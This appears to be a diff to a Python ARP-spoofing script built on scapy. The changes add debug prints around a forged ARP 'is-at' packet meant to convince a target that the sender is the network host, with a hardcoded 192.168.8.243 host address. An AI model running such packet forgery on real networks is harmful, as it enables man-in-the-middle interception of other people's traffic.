@@ -27,6 +27,9 @@ class arp_spoofing:
 
         packet = scapy.ARP(op='is-at', pdst=target_ip, hwdst = arp_spoofing.get_mac(target_ip), psrc = spoof_ip)
         arp_spoofing.saved_packets.append(packet.summary())
+        print("PACKET PACKET YUP\n\n")
+        packet.show()
+        print("\n\nPACKET PACKET YUP")
         scapy.send(packet, verbose = False)
         if verbose:
             #get the MAC address of the default interface we are using
@@ -57,7 +60,7 @@ class arp_spoofing:
         arp_spoofing.host = '192.168.8.243'
 
         arp_spoofing.verbose = True
-        
+
         def interval():
             if arp_spoofing.running:
                 #Telling the target that we are the host
